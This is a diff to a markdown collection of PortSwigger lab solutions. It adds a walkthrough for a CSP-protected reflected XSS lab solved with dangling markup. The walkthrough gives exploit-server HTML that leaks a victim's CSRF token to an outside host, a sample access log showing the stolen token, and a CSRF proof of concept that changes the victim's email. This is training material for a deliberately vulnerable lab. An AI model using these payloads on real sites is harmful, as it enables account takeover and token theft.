@@ -28,6 +28,7 @@
 - [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
 - [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
 - [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
+- [Reflected XSS protected by CSP, with dangling markup attack](#reflected-xss-protected-by-csp-with-dangling-markup-attack)
 
 ## Reflected XSS into HTML context with nothing encoded
 Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
@@ -443,3 +444,53 @@ ${alert(1)}
 2. Observe that the random string has been reflected inside a JavaScript template string.
 3. Replace your input with the following payload to execute JavaScript inside the template string: ``${alert(1)}``
 4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. When you load the page it should trigger an alert.
+
+## Reflected XSS protected by CSP, with dangling markup attack
+Reference: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack
+
+<!-- omit in toc -->
+### Solution
+1. Log in to the lab using the account provided above.
+2. Examine the Update email function. Observe that there is an XSS vulnerability in the [[email]] parameter.
+3. Go to the exploit server and paste the following template into the Body field, substituting the placeholder URLs with your own lab ID and exploit server ID:
+```html
+<body>
+<script>
+let form = document.createElement('form');
+form.action='https://YOUR-LAB-ID.web-security-academy.net/my-account';
+let input = document.createElement('input');
+input.name = 'email';
+input.value = '"><table background=\'//YOUR-EXPLOIT-SERVER-ID.web-security-academy.net?';
+form.append(input);
+document.body.appendChild(form);
+form.submit()
+</script>
+</body>
+```
+4. Click Store and then Deliver exploit to victim. If the victim's browser runs this script while they are still logged in to the lab website, their browser will send a request to the exploit server containing their CSRF token in the query string.
+5. Click Access log. You should see an HTTP interaction that was initiated by the application. This will look something like:
+```
+GET /exploit?%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type=%22hidden%22%20name=%22csrf%22%20value=%22jOBONqhb2sgP2zCGMhKC3rb91j1TAlWX%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class= HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36".
+```
+6. URL decode the query string and note the CSRF token.
+7. Go back to the exploit server. Replace the contents of the Body field with the following CSRF PoC, substituting ``YOUR-LAB-ID`` with the ID of your lab, and ``STOLEN-CSRF-TOKEN`` for the CSRF token you copied from the access log:
+```html
+<body>
+<script>
+let form = document.createElement('form');
+form.action='https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email';
+form.method='post';
+let input = document.createElement('input');
+input.name = 'email';
+input.value = 'hacker@evil-user.net';
+let csrf = document.createElement('input');
+csrf.name = 'csrf';
+csrf.value = 'STOLEN-CSRF-TOKEN';
+form.append(csrf);
+form.append(input);
+document.body.appendChild(form);
+form.submit()
+</script>
+</body>
+```
+8. Click Store and Deliver exploit to victim. The user's email will be changed to ``hacker@evil-user.net``.
